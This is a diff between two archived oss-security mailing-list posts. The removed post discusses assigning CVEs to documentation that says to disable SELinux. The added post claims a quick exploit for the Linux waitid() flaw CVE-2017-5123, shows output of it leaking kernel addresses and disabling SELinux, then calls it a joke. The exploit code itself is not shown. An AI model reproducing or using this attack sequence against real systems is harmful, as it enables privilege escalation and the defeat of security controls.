@@ -1,57 +1,37 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2017/06/15/6
-Message-ID: <d86f3fc7-7fab-4059-6c6c-14bea996d50d@redhat.com>
-Date: Thu, 15 Jun 2017 11:29:26 -0600
-From: "kseifried@...hat.com" <kseifried@...hat.com>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2017/10/25/2
+Message-ID: <20171025124241.12925hypflmm08sg@webmail.alunos.dcc.fc.up.pt>
+Date: Wed, 25 Oct 2017 12:42:41 +0200
+From: up201407890@...nos.dcc.fc.up.pt
 To: oss-security@...ts.openwall.com
-Subject: Re: Re: MySQL - use-after-free after mysql_stmt_close()
+Subject: Re: CVE-2017-5123 Linux kernel v4.13 waitid() not calling access_ok()
 Content-Type: text/plain; charset=utf-8
 
+Hello,
+
+I've written a quick exploit for that vulnerability.
+Instead of using it for malicious purposes, I use it to actually  
+increase my systems security.
+
+$ id
+uid=1000
+$ ./a.out
+[+] Leak size=144 bytes
+[+] Got kernel base: 0xffffffffb5200000
+[+] Got selinux_enforcing: 0xffffffffb611cc90
+[+] Got selinux_enabled: 0xffffffffb5eb1350
+[+] Overwriting selinux_enforcing...
+[+] Overwriting selinux_enabled...
+[+] SELinux disabled!
+
+Enjoy,
+Federico Bento.
+
+PS: It's just a joke :)
 
 
-On 06/15/2017 11:28 AM, Kurt H Maier wrote:
-> On Thu, Jun 15, 2017 at 08:21:29AM -0600, Kurt Seifried wrote:
->> 1) Official documentation that says "do this [insecure thing]" should
->> probably get a CVE (e.g. "turn off all the encryption to make it work more
->> easily"). This should probably get a CVE, especially as it results in
->> operational changes which won't get a CVE (since it's not in code that
->> "ships", it's just on the end of whoever is using it).
-> 
-> I really like this idea.  What would be the approach to software whose
-> documentation starts out with "turn off selinux," out of curiosity?
+----------------------------------------------------------------
+This message was sent using IMP, the Internet Messaging Program.
 
-Good question. I would rephrase it was "turn off the firewall" or "turn
-off the Anti virus" and I think we're definitely into the "yes, that
-needs a CVE" territory (even if it can't be fixed, at least people will
-be more aware and maybe make more informed decisions when picking).
 
-> Obviously this lessens the security stance of the system, but presumably
-> the system is designed to be operable without selinux.  Would CVEs get
-> assigned for all bad ideas, or just those that expose actual attack
-> vectors?
-
-I would say that being told/forced (e.g. most systems that say turn off
-SELinux say that because they couldn't make it work with SELinux on) do
-definitely expose the system and people need to be aware of this.
-
-> 
->> 3) Unofficial but commonly used documentation and code examples, I guess
->> the best example here is stackoverflow and friends?
-> 
-> This is going to cause you to hit INT_MAX relatively quickly.
-
-Well part of it would be the current test case of "does anyone care",
-e.g. do people actually use this/care enough to do the work to assign a
-CVE, if someone wants to spend their time being the CNA for
-stackoverflow and put out good CVEs I'm fine with that.
-
-> 
-> 
-> khm
-> 
-
--- 
-
-Kurt Seifried -- Red Hat -- Product Security -- Cloud
-PGP A90B F995 7350 148F 66BF 7554 160D 4553 5E26 7993
-Red Hat Product Security contact: secalert@...hat.com
+View attachment "selinux.c" of type "text/x-csrc" (2943 bytes)
